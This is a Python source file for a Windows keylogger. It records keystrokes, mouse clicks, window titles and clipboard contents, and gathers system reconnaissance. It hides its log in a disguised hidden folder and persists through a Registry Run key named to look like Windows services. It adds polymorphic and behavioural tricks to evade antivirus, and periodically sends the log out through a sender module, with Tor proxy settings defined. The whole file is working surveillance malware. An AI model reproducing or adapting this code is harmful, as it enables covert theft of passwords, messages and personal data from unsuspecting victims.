#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os, time, random, string, base64, json

# Dynamic loading of polymorphic evasion module to bypass static analysis
try:
    from polymorphic_evasion import get_polymorphic_context, DynamicLoader
    poly_ctx = get_polymorphic_context()
    _has_poly = True
except Exception:
    poly_ctx = None
    DynamicLoader = None
    _has_poly = False

# Dynamic import loading to obfuscate IAT (Import Address Table)
if _has_poly and poly_ctx and DynamicLoader:
    try:
        # Load Windows Registry manipulation functions dynamically
        winreg_module = DynamicLoader.load_module('winreg')
        if winreg_module:
            OpenKey = getattr(winreg_module, 'OpenKey', None)
            SetValueEx = getattr(winreg_module, 'SetValueEx', None)
            CloseKey = getattr(winreg_module, 'CloseKey', None)
            HKEY_CURRENT_USER = getattr(winreg_module, 'HKEY_CURRENT_USER', None)
            KEY_ALL_ACCESS = getattr(winreg_module, 'KEY_ALL_ACCESS', None)
            REG_SZ = getattr(winreg_module, 'REG_SZ', None)
        else:
            from winreg import *
    except:
        from winreg import *
else:
    from winreg import *

if _has_poly and poly_ctx and DynamicLoader:
    try:
        pynput_module = DynamicLoader.load_module('pynput')
        if pynput_module:
            keyboard = getattr(pynput_module, 'keyboard', None)
            mouse_mod = getattr(pynput_module, 'mouse', None)
            mouse = mouse_mod
            Button = getattr(mouse_mod, 'Button', None)
            MouseListener = getattr(mouse_mod, 'Listener', None)
            KeyListener = getattr(getattr(pynput_module, 'keyboard', None), 'Listener', None)
        else:
            from pynput import keyboard, mouse
            from pynput.mouse import Button, Listener as MouseListener
            from pynput.keyboard import Listener as KeyListener
    except:
        from pynput import keyboard, mouse
        from pynput.mouse import Button, Listener as MouseListener
        from pynput.keyboard import Listener as KeyListener
else:
    from pynput import keyboard, mouse
    from pynput.mouse import Button, Listener as MouseListener
    from pynput.keyboard import Listener as KeyListener

if _has_poly and poly_ctx and DynamicLoader:
    try:
        gw_module = DynamicLoader.load_module('pygetwindow')
        if gw_module:
            gw = gw_module
        else:
            import pygetwindow as gw
    except:
        import pygetwindow as gw
else:
    import pygetwindow as gw

import shutil
import requests
import socks
import socket
import Sender_setup
import system_recon
import clipboard_monitor

global t, start_time, onion_address, tor_proxy_host, tor_proxy_port, interval
t = ""

if poly_ctx:
    log_filename = poly_ctx.get_log_filename()
else:
    log_filename = 'SystemLog.dat'

# Mimic system directory for persistence
HIDDEN_DIR = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'System32')
LOG_FILE = os.path.join(HIDDEN_DIR, log_filename)

tor_proxy_host = "127.0.0.1"
tor_proxy_port = 9050
interval = 60

IMMEDIATE_DISK_FLUSH = True
MIN_BUFFER_FLUSH = 50

try:
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)
    try:
        import ctypes
        # Set file attribute to 0x02 (Hidden)
        ctypes.windll.kernel32.SetFileAttributesW(HIDDEN_DIR, 0x02)
    except:
        pass
    # Initialize/Touch the log file
    f = open(LOG_FILE, 'a')
    f.close()
except:
    try:
        f = open(LOG_FILE, 'w')
        f.close()
    except:
        # Last resort fallback if AppData is restricted
        f = open('Logfile.txt', 'w')
        f.close()

def addStartup():
    """
    Establishes persistence via Windows Registry 'Run' key using legitimate-looking service names.
    """
    try:
        if poly_ctx:
            poly_ctx.add_random_delay()
        
        fp = os.path.dirname(os.path.realpath(__file__))
        file_name = sys.argv[0].split('\\')[-1]
        new_file_path = fp + '\\' + file_name
        
        if poly_ctx:
            registry_name = poly_ctx.get_registry_name()
        else:
            registry_names = [
                "Windows Security Update",
                "Microsoft System Service",
                "Windows Defender Service",
                "System Configuration Manager",
                "Windows Update Service"
            ]
            registry_name = random.choice(registry_names)
        
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, registry_name, 0, REG_SZ, new_file_path)
        CloseKey(key2change)
        
        if poly_ctx:
            poly_ctx.add_random_delay()
    except Exception:
        pass

addStartup()

try:
    recon = system_recon.SystemRecon()
    recon_report = recon.formatted_report()
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(recon_report)
    t = recon_report 
except Exception:
    pass

def clipboard_callback(text):
    global t
    t = t + text
    flush_log_buffer()

try:
    clip_monitor = clipboard_monitor.ClipboardMonitor(clipboard_callback)
    clip_monitor.start()
except Exception:
    pass

def flush_log_buffer(force=False):
    global t, LOG_FILE
    
    if not t:
        return
    
    if not force and len(t) < MIN_BUFFER_FLUSH:
        return
    
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(t)
    except:
        with open('Logfile.txt', 'a', encoding='utf-8') as f:
            f.write(t)
    finally:
        t = ''

def Mail_it_Log_File():
    """
    Triggers data exfiltration. Includes random delays for traffic pattern obfuscation.
    """
    global LOG_FILE, HIDDEN_DIR
    if poly_ctx:
        poly_ctx.add_random_delay(0, 50)
    
    try:
        Sender_setup.start_sender(LOG_FILE)
    except Exception:
        pass

def get_window_name():
    try:
        active_window = gw.getActiveWindow()
        if active_window:
            return active_window.title if active_window.title else "Unknown"
        return "Unknown"
    except Exception:
        return "Unknown"

def OnMouseEvent(x, y, button, pressed):
    global t, start_time, interval, LOG_FILE

    # Human behavior emulation: stochastically skip events
    if poly_ctx and not poly_ctx.behavioral.should_perform_action(0.95):
        return True
    
    if pressed:
        if poly_ctx:
            poly_ctx.add_random_delay(0, 10)
        
        window_name = get_window_name()
        data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
            + ' WindowName : ' + window_name
        data += '\n\tButton:' + str(button)
        data += '\n\tClicked in (Position):(' + str(x) + ',' + str(y) + ')'
        data += '\n===================='

        t = t + data

        buffer_size = poly_ctx.buffer_size if poly_ctx else 500
        if len(t) > buffer_size:
            flush_log_buffer(force=True)
        else:
            flush_log_buffer(force=IMMEDIATE_DISK_FLUSH)

        current_interval = interval
        if poly_ctx:
            current_interval = int(poly_ctx.behavioral.random_interval(interval, 15))

        if int(time.time() - start_time) >= int(current_interval):
            flush_log_buffer(force=True)
            Mail_it_Log_File()
            start_time = time.time()
            if poly_ctx and random.random() < 0.3:
                poly_ctx.mutate_config()

    return True

def OnKeyboardEvent(key):
    global t, start_time, interval, LOG_FILE
    
    if poly_ctx and not poly_ctx.behavioral.should_perform_action(0.98):
        return True
    
    try:
        if poly_ctx:
            poly_ctx.add_random_delay(0, 5)
        
        window_name = get_window_name()
        key_str = str(key).replace("'", "")
        data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
            + ' WindowName : ' + window_name
        data += '\n\tKeyboard key :' + key_str
        data += '\n===================='
        
        t = t + data

        buffer_size = poly_ctx.buffer_size if poly_ctx else 500
        if len(t) > buffer_size:
            flush_log_buffer(force=True)
        else:
            flush_log_buffer(force=IMMEDIATE_DISK_FLUSH)

        current_interval = interval
        if poly_ctx:
            current_interval = int(poly_ctx.behavioral.random_interval(interval, 15))

        if int(time.time() - start_time) >= int(current_interval):
            flush_log_buffer(force=True)
            Mail_it_Log_File()
            start_time = time.time()
            if poly_ctx and random.random() < 0.3:
                poly_ctx.mutate_config()
            
    except Exception:
        pass
    
    return True

start_time = time.time()

key_listener = KeyListener(on_press=OnKeyboardEvent)
key_listener.start()

mouse_listener = MouseListener(on_click=OnMouseEvent)
mouse_listener.start()

try:
    key_listener.join()
    mouse_listener.join()
except KeyboardInterrupt:
    key_listener.stop()
    mouse_listener.stop()
